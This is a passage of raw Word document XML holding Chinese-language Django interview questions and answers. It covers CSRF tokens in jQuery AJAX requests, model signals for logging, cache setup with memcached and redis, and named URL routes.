    <w:p w14:paraId="5F5446BB"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return</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (/^(GET|HEAD|OPTIONS|TRACE)$/.test(method));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F2A4ADA"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54865BA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$.ajaxSetup({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4176A99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beforeSend: </w:t>
      </w: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(xhr, settings) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0055389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(!csrfSafeMethod(settings.type) &amp;&amp; !</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>this</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.crossDomain) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6067A7F4"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xhr.setRequestHeader("X-CSRFToken", csrftoken);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03A32BF7"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25DA48F2"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422D37D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5BC326D7"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8000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/****************** END ******************/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68B5DEBE" w14:textId="77777777" w:rsidR="001E7149" w:rsidRPr="00002D25" w:rsidRDefault="001E7149" w:rsidP="001E7149">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="150" w:after="150"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上面代码的作用就是让你的</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的</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法带上</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>需要的令牌，它依赖</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>jQuery</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>库，必须提前加载</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>jQuery</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>。这也是</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>官方提供的解决方案，请参考。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="242F1AA8" w14:textId="77777777" w:rsidR="001E7149" w:rsidRPr="00002D25" w:rsidRDefault="001E7149" w:rsidP="001E7149">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="150" w:after="150" w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法二（用在</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>文件中）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E1E6DA2" w14:textId="77777777" w:rsidR="001E7149" w:rsidRPr="00002D25" w:rsidRDefault="001E7149" w:rsidP="001E7149">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="150" w:after="150"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简单快捷的解决办法，示例如下。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3060A81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$.ajax({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="071D0B5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type: "POST",       </w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>// POST方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0049D18B"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url: "{% url 'oper:course_add_comment' %}",     </w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>// 处理请求的url</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AF8846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data: {'course_id': {{ course_id }}, 'comment': comment},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AFC6B7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async: </w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60B47D3D"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cache: </w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07357D68"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beforeSend: </w:t>
      </w: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(xhr, settings) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A18B60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xhr.setRequestHeader("X-CSRFToken", "{{ csrf_token }}");    </w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>// 重点是这里! 注意{{ csrf_token }}必须加上引号!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="110B192F"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71D1EB3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success: </w:t>
      </w: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(data) {          </w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>// 请求成功后，视图传回的数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D39F108"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(data.status == 'fail') {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52E0752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(data.msg == '用户未登录') {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07FC452C"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alert("您还未登录，不能评论！点击右上角登录按钮进行登录。");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73F66C3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 </w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>else</w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FA1916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lastRenderedPageBreak/>
        <w:t xml:space="preserve">                alert(data.msg)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0453209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0415047D"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 </w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>else</w:t>
      </w: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(data.status == 'success') {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3559F086"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alert(data.msg);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="566D189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location.reload();         </w:t>
      </w:r>
      <w:r w:rsidRPr="00002D25">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>// 刷新当前页面</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3255903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178A06F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2538FC2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162F4622" w14:textId="2BE4FDCF" w:rsidR="001E7149" w:rsidRPr="001A250B"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043</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中如何实现</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ORM</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>表中添加数据时创建一条日志记录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D1FFC64" w14:textId="768A7B5C" w:rsidR="003B7702" w:rsidRDefault="003B7702"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B7702">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> 给信号注册函数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EA23C87" w14:textId="50BB5105"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使用Django的信号机制，可以在添加、删除数据前后设置日志记录：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20F8C70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pre_init  # Django中的model对象执行其构造方法前,自动触发</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02F85C6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post_init  # Django中的model对象执行其构造方法后,自动触发</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CFD44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pre_save  # Django中的model对象保存前,自动触发</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B281A0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post_save  # Django中的model对象保存后,自动触发</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C7CADE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pre_delete  # Django中的model对象删除前,自动触发</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F77C15F"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post_delete  # Django中的model对象删除后,自动触发</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45DE5F32"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="601CBCF2"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@receiver(post_save, sender=Myclass)　　 　　　　# 信号接收装饰器。由于内置信号，所以直接接收</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B2BBA70"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signal_handler(sender, **kwargs):　　　　　　# 接收到信号后，在此处理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B8FD3A2"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logger = logging.getLogger()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56280FDE" w14:textId="179C204C"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logger.success('保存成功')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59F5A438" w14:textId="7B202BAF" w:rsidR="001E7149" w:rsidRPr="001A250B"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044</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缓存如何设置？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FA9D9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Django中提供了6种缓存方式：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="721379A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开发调试（默认缓存）</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内存</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文件</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数据库</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Memcache缓存</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第三方库支持redis：django-redis</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70300DB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设置缓存：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E8BB32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全站缓存（中间件）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5064882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MIDDLEWARE = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BC827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‘django.middleware.cache.UpdateCacheMiddleware’, 　　　　#第一个位置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08AB789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'django.middleware.common.CommonMiddleware',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="353E8E5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‘django.middleware.cache.FetchFromCacheMiddleware’, 　　 #最后位置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A0C237D"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3BE6F2F3" w14:textId="37B6C764"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CACHES = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2603243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'default': {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="619197A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'BACKEND': 'django.core.cache.backends.memcached.MemcachedCache', 　　 # 取决于您选择的Memcached绑定</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29734ED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'LOCATION': ['127.0.0.1:11211', ],  　　# 缓存后端服务器位置，支持分布式，可多个</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47A537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'TIMEOUT': 5 * 60,  　　# 缓存超时，默认300s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="284BFA7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b/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05D52F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5E7DD4C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视图缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C590E0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@cache_page(15)          #超时时间为15秒</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F7B97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index(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63823A9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t=time.time()      　　#获取当前时间</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="160DCA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render(request,"index.html",locals())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A17E9C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模板缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7271764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load cache %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05D25D1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cache 2 'name' %} 　　# 存的key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="724A7E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&lt;h3&gt;缓存:{{ t }}&lt;/h3&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EF6BA3B"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endcache %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A5328E6" w14:textId="25B8A54F" w:rsidR="001E7149" w:rsidRPr="001A250B"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045</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的缓存能使用</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>redis</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>吗？如果可以的话，如何配置？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E732953"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在setting添加配置文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7354D39F" w14:textId="3EBA5C49"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配置中间件同上。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1847735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CACHES = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="081FF4A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"default": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CFA22D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"BACKEND": "django_redis.cache.RedisCache", 　　# 缓存类型</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33170F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"LOCATION": "127.0.0.1:6379", 　　# 缓存服务器IP和端口</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16BF93E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"OPTIONS": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E9A5E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"CLIENT_CLASS": "django_redis.client.DefaultClient",  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="132B6D8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"CONNECTION_POOL_KWARGS": {"max_connections": 100} 　　# 连接池最大连接数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="041556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"PASSWORD": "123456",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41AA9F4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9AE74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4BB84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68E9F0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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71C3B0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index(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B48EF8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conn = get_redis_connection("default")　　　　# 根据名字去连接池中获取连接</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3819EC8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conn.hset('n1','k1','v1') 　　# 存数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5593D2D4"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HttpResponse('...')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="230BFC6A" w14:textId="7DA032CE" w:rsidR="001E7149" w:rsidRPr="00BF3003"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lastRenderedPageBreak/>
        <w:t>046</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路由系统中</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>name</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的作用？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DDF297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反向解析路由字符串.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24342E23" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="001E7149" w:rsidP="001E7149">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>  url</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(r'^home'</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>, views.home, name</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>='home')</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F733179" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="001E7149" w:rsidP="001E7149">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>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在模板中使用：</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>{ % </w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>url </w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>'home' %}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1547054A" w14:textId="00DAA832" w:rsidR="001E7149" w:rsidRPr="00FC385A" w:rsidRDefault="001E7149" w:rsidP="001E7149">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>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在视图中使用：</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>reverse</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>'home'</w:t>
      </w:r>
      <w:r w:rsidRPr="00FC385A">
